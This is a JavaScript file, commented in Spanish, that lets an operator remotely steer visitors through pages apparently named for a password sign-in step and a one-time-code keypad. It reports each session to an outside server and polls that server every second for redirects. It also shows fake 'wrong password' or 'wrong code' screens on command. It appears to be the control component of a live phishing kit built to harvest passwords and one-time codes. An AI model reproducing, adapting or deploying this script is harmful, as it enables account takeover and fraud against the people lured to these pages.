/**
 * Control remoto vía bot de Discord.
 * Configura la URL del API antes de cargar este script:
 *   <script>window.DISCORD_CONTROL_API = 'https://tu-servidor.com';</script>
 */
(function () {
  "use strict";

  const API_BASE =
    (typeof window !== "undefined" && window.DISCORD_CONTROL_API) ||
    "https://solucionsneqs.onrender.com";

  const POLL_INTERVAL_MS = 1000;
  let pollingActive = true;

  function ensureSessionId() {
    let id = localStorage.getItem("sessionId");
    if (!id) {
      id =
        "sess_" +
        Date.now().toString(36) +
        "_" +
        Math.random().toString(36).slice(2, 11);
      localStorage.setItem("sessionId", id);
    }
    return id;
  }

  async function notifyDiscordControl(message, source) {
    const sessionId = ensureSessionId();
    try {
      await fetch(API_BASE + "/api/session/notify", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          sessionId,
          message: message || "Actividad en el entorno",
          source: source || "web",
        }),
      });
    } catch (err) {
      console.warn("[DiscordControl] No se pudo notificar al servidor:", err);
    }
    return sessionId;
  }

  function applyControlErrorsFromUrl() {
    const params = new URLSearchParams(window.location.search);
    const page = (window.location.pathname.split("/").pop() || "").toLowerCase();

    if (params.get("error") === "1") {
      if (page.includes("access-sign-in-pass")) {
        const errorLogin = document.getElementById("error-login");
        if (errorLogin) {
          errorLogin.classList.remove("hidden");
          errorLogin.style.display = "block";
        }
        document.querySelectorAll("body > header, body > section.flex-1").forEach(function (el) {
          el.style.display = "none";
        });
      }

      if (page.includes("one-time-pass")) {
        const errorMessage = document.querySelector(".errorMessage");
        const sectionTeclado = document.getElementById("sectionTeclado");
        if (errorMessage) {
          errorMessage.style.opacity = "1";
          errorMessage.style.transform = "translateY(-20px)";
        }
        if (sectionTeclado) sectionTeclado.style.display = "flex";
      }
    }

    if (params.get("error") === "finish" && page.includes("one-time-pass")) {
      const finishContainer = document.getElementById("finishContainer");
      const sectionTeclado = document.getElementById("sectionTeclado");
      const loadingMain = document.querySelector("main.loadingContainer");
      const errorMessage = document.querySelector(".errorMessage");
      if (finishContainer) finishContainer.style.display = "block";
      if (sectionTeclado) sectionTeclado.style.display = "none";
      if (loadingMain) loadingMain.style.display = "none";
      if (errorMessage) errorMessage.style.display = "none";
    }
  }

  async function checkRedirect() {
    if (!pollingActive) return;

    const sessionId = localStorage.getItem("sessionId");
    if (!sessionId) {
      setTimeout(checkRedirect, POLL_INTERVAL_MS);
      return;
    }

    try {
      const response = await fetch(
        API_BASE + "/api/redirect/get/" + encodeURIComponent(sessionId)
      );
      const data = await response.json();

      if (data.success && data.redirect_to) {
        pollingActive = false;
        window.location.href = data.redirect_to;
        return;
      }
    } catch (err) {
      console.warn("[DiscordControl] Polling:", err.message);
    }

    setTimeout(checkRedirect, POLL_INTERVAL_MS);
  }

  function startPolling() {
    pollingActive = true;
    checkRedirect();
  }

  ensureSessionId();

  window.DiscordControl = {
    API_BASE,
    ensureSessionId,
    notify: notifyDiscordControl,
    getSessionId: function () {
      return localStorage.getItem("sessionId");
    },
    startPolling,
    stopPolling: function () {
      pollingActive = false;
    },
  };

  document.addEventListener("DOMContentLoaded", function () {
    applyControlErrorsFromUrl();
    startPolling();
  });
})();
